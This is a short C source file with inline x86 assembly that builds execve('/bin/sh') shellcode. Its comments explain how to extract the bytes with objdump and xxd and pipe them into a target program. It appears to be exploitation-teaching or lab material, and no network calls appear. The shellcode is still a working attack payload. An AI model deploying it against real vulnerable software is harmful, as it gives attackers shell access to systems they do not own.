/** File:		shell_exec.c
 ** Author:		Dongli Zhang
 ** Contact:	dongli.zhang0129@gmail.com
 **
 ** Copyright (C) Dongli Zhang 2013
 **
 ** This program is free software;  you can redistribute it and/or modify
 ** it under the terms of the GNU General Public License as published by
 ** the Free Software Foundation; either version 2 of the License, or
 ** (at your option) any later version.
 **
 ** This program is distributed in the hope that it will be useful,
 ** but WITHOUT ANY WARRANTY;  without even the implied warranty of
 ** MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See
 ** the GNU General Public License for more details.
 **
 ** You should have received a copy of the GNU General Public License
 ** along with this program;  if not, write to the Free Software 
 ** Foundation, 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA
 */

/* This program is used as the source of shellcode for execve
 * gcc shell_exec.c -o shell_exec
 * objdump -d shell_exec | sed -n '/shell_begin/,/shell_end/p'
 * echo $((0x4dc-0x4bf))
 * xxd -s0x4bf -l32 -p shell_exec shellcode
 * ((cat shellcode | xxd -r -p) ; cat) | ./run
*/

//movb $0xb, %al               \n\  ;Number of the execve(2) syscall
//int 0x80                       \n\ ;Execute the syscall
int main(int argc, char **argv)
{
	asm("\
		shell_begin:                 \n\
		jmp transfer                 \n\
		code: pop %ebx               \n\
		xor %eax, %eax               \n\
		movb $0xb, %al               \n\
		xor %ecx, %ecx               \n\
		xor %edx, %edx               \n\
		int $0x80                    \n\
		transfer: call code          \n\
		.string \"/bin/sh\"          \n\
		shell_end: .octa 0xdeadbeef  \n\
	");
}
